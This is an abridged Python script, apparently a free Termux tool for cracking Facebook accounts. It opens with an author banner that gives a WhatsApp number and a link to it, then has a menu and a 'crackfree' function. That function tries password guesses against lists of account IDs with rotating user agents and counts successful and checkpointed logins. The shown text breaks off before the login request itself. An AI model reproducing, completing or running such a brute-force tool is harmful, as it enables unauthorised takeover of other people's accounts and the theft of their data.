os.system("pkg install request")
#-----------------[ Anup ]----------------#
import request,bs4,json,os,sys,random,datetime,time,re
import random 
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mAnupsantra ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Anup Santra ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mAnupsantra ]   ║\33[1;34m   
╠══[Whatsapp                 • 6295*****0 ]  ║\33[1;35m 
╠══[TOOLS                    • Free ]         ║ \33[1;32m   
...
os.system('espeak -a 300 " Welcome,   to,  Anup,  Tools"')
pass
...
def menu():
    ...
    if ANUP in ['111']:
        ...
        os.system('xdg-open https://wa.me/+916295488690')
        os.system("python nono.py")
    elif ANUP in ['3','03']:
        result()
    elif ANUP in ['0']:
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Anup-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
